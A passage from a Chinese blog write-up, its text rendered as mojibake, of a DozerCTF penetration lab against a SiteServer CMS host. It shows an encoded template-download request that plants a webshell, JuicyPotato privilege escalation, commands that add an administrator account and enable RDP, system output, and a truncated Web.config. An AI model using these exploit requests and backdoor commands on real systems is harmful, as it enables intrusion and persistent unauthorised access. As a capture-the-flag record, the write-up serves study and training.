cs.FlushFinalBlock();          _outString = Convert.ToBase64String(ms.ToArray());          Console.WriteLine("DesEncrypt:"); Console.WriteLine(_outString); }      catch (Exception error) { _noteMessage = error.Message; }  } } }</code></pre><p>ç”Ÿæˆçš„åœ°å€å†ç”¨ python æ›¿æ¢ä¸€ä¸‹å‡ ä¸ªå­—ç¬¦ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">aZlBAFKTavDq1a13yzD3E1jziPhCL9Y1W0HUgoWERF7oXIBq9tKZFNVSSoWFIGM+wUVVDMPLriIYZOrTHFNH6wuBxt9fr/hX771Ey8w4BJ0t1koCOIzYQO2arzX9xfWGb1bTT6ElmWU<span class="token operator">=</span><span class="token comment"># python</span>str_decry.replace<span class="token punctuation">(</span><span class="token string">"+"</span>, <span class="token string">"0add0"</span><span class="token punctuation">)</span>.replace<span class="token punctuation">(</span><span class="token string">"="</span>, <span class="token string">"0equals0"</span><span class="token punctuation">)</span>.replace<span class="token punctuation">(</span><span class="token string">"&amp;"</span>, <span class="token string">"0and0"</span><span class="token punctuation">)</span>.replace<span class="token punctuation">(</span><span class="token string">"?"</span>, <span class="token string">"0question0"</span><span class="token punctuation">)</span>.replace<span class="token punctuation">(</span><span class="token string">"/"</span>, <span class="token string">"0slash0"</span><span class="token punctuation">)</span>aZlBAFKTavDq1a13yzD3E1jziPhCL9Y1W0HUgoWERF7oXIBq9tKZFNVSSoWFIGM0add0wUVVDMPLriIYZOrTHFNH6wuBxt9fr0slash0hX771Ey8w4BJ0t1koCOIzYQO2arzX9xfWGb1bTT6ElmWU0equals0</code></pre><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210531001202153.png"></p><p>ï¼Ÿï¼Ÿï¼Ÿæ€ä¹ˆè¿˜æ˜¯ä¸è¡Œï¼Ÿ</p><p>äºæ˜¯æ”¾è‡ªå·± vps ä¸Šè¯•äº†è¯•ï¼Œå‘ç°æ ¹æœ¬æ²¡æœ‰è¯·æ±‚è®°å½•ï¼Œçœ‹æ¥ <strong>ä¸å‡ºç½‘</strong>ã€‚</p><p>æ°”æ­»äº†ã€‚</p><p>ä¹ˆå¾—åŠæ³•ï¼Œåªèƒ½å…ˆæŠŠæ–‡ä»¶ä¼ åˆ°æœ€å¼€å§‹çš„æœºå™¨ä¸Šï¼Œç„¶åèµ·ä¸ª web æœåŠ¡ï¼Œå†æŠŠæ–‡ä»¶é€šè¿‡è¿™å°ä¸‹è½½ã€‚</p><pre class="language-none"><code class="language-none">http://10.10.1.47:12345/poxteam.zipZjYIub/YxA05+dg8BqV7gX//DhYyedHPT79r6KQFp5dKGh7t/3uUZA==ZjYIub0slash0YxA050add0dg8BqV7gX0slash00slash0DhYyedHPT79r6KQFp5dKGh7t0slash03uUZA0equals00equals0</code></pre><p><a href="http://10.10.1.234/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&amp;userKeyPrefix=test&amp;downloadUrl=ZjYIub0slash0YxA050add0dg8BqV7gX0slash00slash0DhYyedHPT79r6KQFp5dKGh7t0slash03uUZA0equals00equals0&amp;directoryName=test233">http://10.10.1.234/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&amp;userKeyPrefix=test&amp;downloadUrl=ZjYIub0slash0YxA050add0dg8BqV7gX0slash00slash0DhYyedHPT79r6KQFp5dKGh7t0slash03uUZA0equals00equals0&amp;directoryName=test233</a></p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210531002232643.png"></p><p>ç»ˆäºæ‹¿åˆ°é©¬äº†ã€‚</p><p><a href="http://10.10.1.234/SiteFiles/SiteTemplates/test233/include.aspx">http://10.10.1.234/SiteFiles/SiteTemplates/test233/include.aspx</a></p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210531002341519.png"></p><p>å¥½è€¶ï¼</p><p>å¥½å®¶ä¼™ï¼Œä¸€å †çš„ shellã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210531002452908.png"></p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210531022447586.png"></p><p>çœ‹äº†ä¸‹è¿™å°æœºå™¨è²Œä¼¼æ²¡æœ‰åŸŸç¯å¢ƒã€‚</p><p>ç„¶åæ‰¾äº†åŠå¤©æ²¡æ‰¾åˆ° flag åœ¨å“ªâ€¦â€¦</p><p>å†æ•´ä¸ªå†°èğŸä¼ ä¸Šå»ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210531012405870.png"></p><pre class="language-sh" data-language="sh"><code class="language-sh"># whoamiiis apppool\defaultapppool</code></pre><p>systeminfo</p><pre class="language-none"><code class="language-none">ä¸»æœºå:           WIN-UIARPOTP0ALOS åç§°:          Microsoft Windows Server 2012 DatacenterOS ç‰ˆæœ¬:          6.2.9200 æš‚ç¼º Build 9200OS åˆ¶é€ å•†:        Microsoft CorporationOS é…ç½®:          ç‹¬ç«‹æœåŠ¡å™¨OS æ„ä»¶ç±»å‹:      Multiprocessor Freeæ³¨å†Œçš„æ‰€æœ‰äºº:     Windows ç”¨æˆ·æ³¨å†Œçš„ç»„ç»‡:       äº§å“ ID:          00184-70000-00000-AA252åˆå§‹å®‰è£…æ—¥æœŸ:     2021/5/15, 19:55:24ç³»ç»Ÿå¯åŠ¨æ—¶é—´:     2021/5/30, 12:38:55ç³»ç»Ÿåˆ¶é€ å•†:       VMware, Inc.ç³»ç»Ÿå‹å·:         VMware Virtual Platformç³»ç»Ÿç±»å‹:         x64-based PCå¤„ç†å™¨:           å®‰è£…äº† 1 ä¸ªå¤„ç†å™¨ã€‚                  [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~1796 MhzBIOS ç‰ˆæœ¬:        Phoenix Technologies LTD 6.00, 2019/7/29Windows ç›®å½•:     C:\Windowsç³»ç»Ÿç›®å½•:         C:\Windows\system32å¯åŠ¨è®¾å¤‡:         \Device\HarddiskVolume1ç³»ç»ŸåŒºåŸŸè®¾ç½®:     zh-cn;ä¸­æ–‡(ä¸­å›½)è¾“å…¥æ³•åŒºåŸŸè®¾ç½®:   zh-cn;ä¸­æ–‡(ä¸­å›½)æ—¶åŒº:             (UTC+08:00)åŒ—äº¬ï¼Œé‡åº†ï¼Œé¦™æ¸¯ç‰¹åˆ«è¡Œæ”¿åŒºï¼Œä¹Œé²æœ¨é½ç‰©ç†å†…å­˜æ€»é‡:     2,047 MBå¯ç”¨çš„ç‰©ç†å†…å­˜:   1,243 MBè™šæ‹Ÿå†…å­˜: æœ€å¤§å€¼: 4,095 MBè™šæ‹Ÿå†…å­˜: å¯ç”¨:   3,017 MBè™šæ‹Ÿå†…å­˜: ä½¿ç”¨ä¸­: 1,078 MBé¡µé¢æ–‡ä»¶ä½ç½®:     C:\pagefile.sysåŸŸ:               WORKGROUPç™»å½•æœåŠ¡å™¨:       æš‚ç¼ºä¿®è¡¥ç¨‹åº:         å®‰è£…äº† 2 ä¸ªä¿®è¡¥ç¨‹åºã€‚                  [01]: KB2999226                  [02]: KB4012214ç½‘å¡:             å®‰è£…äº† 1 ä¸ª NICã€‚                  [01]: Intel(R) 82574L åƒå…†ç½‘ç»œè¿æ¥                      è¿æ¥å:      Ethernet0                      å¯ç”¨ DHCP:   å¦                      IP åœ°å€                        [01]: 10.10.1.234                        [02]: fe80::4446:784:6de4:d42aHyper-V è¦æ±‚:     å·²æ£€æµ‹åˆ°è™šæ‹Ÿæœºç›‘æ§ç¨‹åºã€‚å°†ä¸æ˜¾ç¤º Hyper-V æ‰€éœ€çš„åŠŸèƒ½ã€‚</code></pre><p>å¯»æ€ç€ flag æ˜¯ä¸æ˜¯æ”¾åœ¨ Administrator ç”¨æˆ·æ¡Œé¢ä¸Šå‘¢ï¼Ÿ<em>ï¼ˆè™½ç„¶æœ€åå‘ç°å¹¶æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶å¤¹</em></p><p>è¯•äº†å¥½å‡ ç§ææƒæ–¹æ³•ï¼Œä½†ä¸€èˆ¬éƒ½æ˜¯ msf æˆ–è€… CS æˆ–è€…å°±è¿œç¨‹ä¸Šå»å¼¹çª—å£çš„ï¼Œè¯•äº†éƒ½ä¹ˆå¾—ç”¨ã€‚</p><p>å‘ç°ç”¨çš„å†°èçš„ä»£ç æ‰§è¡Œæœ‰ç‚¹é—®é¢˜ï¼Œäºæ˜¯å†æ‰“äº†ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œç”¨èšå‰‘è¿ä¸Šå»ã€‚</p><p>æœ€åæ•´äº†ä¸ªçƒ‚åœŸè±†ï¼Œç›´æ¥åœ¨ webshell ææƒå¥½äº†ã€‚</p><p>ä¸è¿‡æœ‰ä¸ªç¼ºç‚¹æ˜¯è²Œä¼¼åªèƒ½æ‰§è¡Œä¸€æ¡å‘½ä»¤ï¼ˆï¼Ÿï¼‰ï¼Œå””ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210531040409922.png"></p><p>è²Œä¼¼ä¹Ÿæ‰¾ä¸åˆ° flag åœ¨å“ªå•Šâ€¦â€¦</p><p>åˆå»æ‰¾äº†åˆ«äººçš„ææƒè¿‡ç¨‹â€¦â€¦</p><p>æ¯”å¦‚ <a href="https://xz.aliyun.com/t/5899">è®°ä¸€æ¬¡Windowsæ¸—é€ææƒå†ç¨‹</a></p><p>æ–°å»ºä¸ªè´¦å·ï¼Œæ·»åŠ åˆ°ç®¡ç†ç»„é‡Œã€‚è¿™é‡Œå°±ä¸æ•´å½±å­ç”¨æˆ·äº†ã€‚</p><pre class="language-sh" data-language="sh"><code class="language-sh">net user root test456123!net localgroup administrators root /add</code></pre><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210531052820946.png"></p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210531040618737.png"></p><p>å¼€å¯è¿œç¨‹æ¡Œé¢ã€‚</p><pre class="language-sh" data-language="sh"><code class="language-sh">JuicyPotatoweb.exe -p "REG ADD \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f"JuicyPotatoweb.exe -p "REG ADD \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 0x00000d3d /f"REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections</code></pre><p>æœ€åä¸€è¡Œå‘½ä»¤æ˜¯æŸ¥è¯¢è¿œç¨‹æ¡Œé¢æ˜¯å¦å¼€å¯ï¼Œ0x0 è¡¨ç¤ºå¼€å¯ï¼Œ0x1 è¡¨ç¤ºå…³é—­ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210531052921850.png"></p><p>è¿™é‡Œå‘ç° rdesktop åˆè¿ä¸ä¸Šï¼Œæç¤º <code>Failed to connect, CredSSP required by server (check if server has disabled old TLS versions, if yes use -V option).</code></p><p>å‚è€ƒ <a href="https://zhuanlan.zhihu.com/p/371497627">rdesktopè¿æ¥Windowsè¿œç¨‹æ¡Œé¢å› CredSSP æŠ¥é”™è§£å†³åŠæ³•</a></p><p>æŠ˜è…¾äº†åŠå¤©ï¼Œæœ€åæ¢äº† remmina è¿ä¸Šäº†ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210531044703263.png"></p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210531044851525.png"></p><p>ä¸Šå»æ‰¾äº†ä¸€æ³¢å•¥ä¹Ÿæ²¡æ‰¾åˆ°ï¼Œæœ€åå‘ç°æ˜¯åœ¨ç½‘ç«™æ ¹ç›®å½•çš„ <code>Web.config.bak</code>â€¦</p><p>æ°”æ­»å–µå–µäº†ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210531045801932.png"></p><p>é‚£ç›´æ¥åœ¨æœ€å¼€å§‹çš„é©¬å°±èƒ½æ‹¿åˆ°äº†å•Šï¼Œåè€¶ï¼</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210531045958641.png"></p><p><code>DozerCTF{b59d9f9e843dedb09e407849f3396cb1}</code></p><p>å†çœ‹ <code>Web.config</code></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appSettings</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>add</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IsProtectData<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>add</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>DatabaseType<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>9XtLPj6oytMAr6M9jZ0Xvg0equals00equals0<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>add</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ConnectionString<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Zg3p37CSquO0slash0DelgBGFVO0J0BlhMxqbj6HR98UP8h4kojeoW8A0slash0xZh4im63w0tn2nuW7n5XRcDo0equals0<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appSettings</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>system.web</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>httpRuntime</span> <span class="token attr-name">requestValidationMode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.0<span class="token punctuation">"</span></span> <span class="token attr-name">requestPathInvalidCharacters</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">maxRequestLength</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>40960<span class="token punctuation">"</span></span> <span class="token attr-name">executionTimeout</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2000<span class="token punctuation">"</span></span> <span class="token attr-name">useFullyQualifiedRedirectUrl</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span> <span class="token attr-name">minFreeThreads</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8<span class="token punctuation">"</span></span> <span class="token attr-name">minLocalRequestFreeThreads</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4<span class="token punctuation">"</span></span> <span class="token attr-name">appRequestQueueLimit</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">enableVersionHeader</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pages</span> <span class="token attr-name">validateRequest</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span> <span class="token attr-name">enableSessionState</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token attr-name">enableViewState</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token attr-name">enableEventValidation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span> <span class="token attr-name">controlRenderingCompatibilityVersion</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4.0<span class="token punctuation">"</span></span> <span class="token attr-name">clientIDMode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>AutoID<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>customErrors</span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Off<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sessionState</span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>InProc<span class="token punctuation">"</span></span> <span class="token attr-name">timeout</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>30<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>trace</span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span> <span class="token attr-name">requestLimit</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span> <span class="token attr-name">pageOutput</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token attr-name">traceMode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>SortByTime<span class="token punctuation">"</span></span> <span class="token attr-name">localOnly</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>globalization</span> <span class="token attr-name">fileEncoding</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token attr-name">requestEncoding</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token attr-name">responseEncoding</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>compilation</span> <span class="token attr-name">debug</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>system.web</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>system.webServer</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modules</span><span class="token punctuation">&gt;</span></span>      <span class="token comment">&lt;!--iisnodeé»˜è®¤ä¸æ”¯æŒPUTå’ŒDELETEçš„è§£å†³--&gt;</span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>remove</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>WebDAVModule<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>      <span class="token comment">&lt;!--è·¯ç”±æ¨¡å‹åˆ æ‰å†åŠ ä¸€æ¬¡--&gt;</span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>remove</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UrlRoutingModule-4.0<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>add</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UrlRoutingModule-4.0<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>System.Web.Routing.UrlRoutingModule<span class="token punctuation">"</span></span> <span class="token attr-name">preCondition</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>add</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ErrorRedirectModule<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>SiteServer.API.ErrorRedirectModule, SiteServer.API<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modules</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>handlers</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>remove</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ExtensionlessUrlHandler-Integrated-4.0<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>remove</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>OPTIONSVerbHandler<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>remove</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TRACEVerbHandler<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>add</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ExtensionlessUrlHandler-Integrated-4.0<span class="token punctuation">"</span></span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*.<span class="token punctuation">"</span></span> <span class="token attr-name">verb</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>System.Web.Handlers.TransferRequestHandler<span class="token punctuation">"</span></span> <span class="token attr-name">preCondition</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>integratedMode,runtimeVersionv4.0<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>handlers</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>system.webServer</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>runtime</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>assemblyBinding</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>urn:schemas-microsoft-com:asm.v1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependentAssembly</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>assemblyIdentity</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Newtonsoft.Json<span class="token punctuation">"</span></span> <span class="token attr-name">publicKeyToken</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>30ad4fe6b2a6aeed<span class="token punctuation">"</span></span> <span class="token attr-name">culture</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>neutral<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bindingRedirect</span> <span class="token attr-name">oldVersion</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.0.0.0-9.0.0.0<span class="token punctuation">"</span></span> <span class="token attr-name">newVersion</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>9.0.0.0<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependentAssembly</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependentAssembly</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>assemblyIdentity</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>System.Web.Http<span class="token punctuation">"</span></span> <span class="token attr-name">publicKeyToken</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>31bf3856ad364e35<span class="token punctuation">"</span></span> <span class="token attr-name">culture</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>neutral<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bindingRedirect</span> <span class="token attr-name">oldVersion</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.0.0.0-5.2.3.0<span class="token punctuation">"</span></span> <span class="token attr-name">newVersion</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5.2.3.0<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependentAssembly</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependentAssembly</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>assemblyIdentity</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>System.Net.Http.Formatting<span class="token punctuation">"</span></span> <span class="token attr-name">publicKeyToken</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>31bf3856ad364e35<span class="token punctuation">"</span></span> <span class="token attr-name">culture</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>neutral<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bindingRedirect</span> <span class="token attr-name">oldVersion</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.0.0.0-5.2.3.0<span class="token punctuation">"</span></span> <span class="token attr-name">newVersion</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5.2.3.0<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependentAssembly</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependentAssembly</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>assemblyIdentity</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Microsoft.Owin<span class="token punctuation">"</span></span> <span class="token attr-name">publicKeyToken</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>31bf3856ad364e35<span class="token punctuation">"</span></span> <span class="token attr-name">culture</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>neutral<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bindingRedirect</span> <span class="token attr-name">oldVersion</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.0.0.0-2.1.0.0<span class="token punctuation">"</span></span> <span class="token attr-name">newVersion</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.1.0.0<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependentAssembly</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependentAssembly</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token 